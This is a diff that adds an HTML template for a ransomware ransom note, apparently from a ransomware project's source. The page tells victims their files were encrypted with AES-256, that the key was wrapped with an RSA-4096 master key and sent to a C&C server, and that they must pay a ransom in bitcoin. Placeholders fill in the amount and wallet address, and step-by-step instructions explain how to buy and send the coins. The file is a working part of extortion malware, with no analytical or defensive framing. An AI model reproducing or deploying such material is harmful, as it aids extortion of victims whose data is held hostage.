@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Your files have being encrypted!</title>
+	<meta name="description" content="">
+	<meta name="author" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="css/normalize.css">
+	<link rel="stylesheet" href="css/skeleton.css">
+
+	<!-- Icons -->
+	<link rel="icon" type="image/png" href="images/favicon.png">
+
+</head>
+<body>
+	<div class="container">
+		<div style="margin-top: 15%">
+			<div class="row">
+					<h4>Your files have being encrypted!</h4>
+					<p>Your files have being encrypted on this computer. <a href="">Here</a> is a complete list of the encrypted files, and you can personally verify this.</p>
+					<p>These files were encrypted using <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES-256</a> with a key generated on this computer. The key was later encrypted using the <a href="https://en.wikipedia.org/wiki/RSA_%28cryptosystem%29">RSA-4096</a> public key of the master; this ciphertext produced was/will be sent to the C&C server. The only way to get your files back is to obtain the AES-256 key by the paying the ransom.</p>
+			</div>
+			<div class="row">
+					<h4>How to pay</h4>
+					<p>You have to pay the ransom of {{.Ransom}} in <a href="https://en.wikipedia.org/wiki/Bitcoin">bitcoins</a> to the address {{.Address}}. The current exchange value of one bitcoin can be found <a href="https://blockchain.info/wallet/price-of-one-bitcoin">here</a>; note that you can trade fractions of a bitcoin (0.004, 0.04, 0.4).</p>
+			</div>
+			<div class="row">
+					<h4>How to buy bitcoins</h4>
+					<p>Buying bitcoin is easy, just follow the instructions:</p>
+					<p>
+						<ul>
+							<li>Register an Account with a Bitcoin Exchange (<a href="https://www.bitstamp.net/">Bitstamp</a>, <a href="https://btc-e.com/">BTC-E</a>, or <a href="https://cex.io/">CEX</a>)</li>
+							<li>Deposit funds through a credit/debit card or bank transfer.</li>
+							<li>Withdraw {{.Ransom}} bitcoins to {{.Address}}.</li>
+							<li>Wait for the transaction to be completed.</li>
+						</ul>
+					</p>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
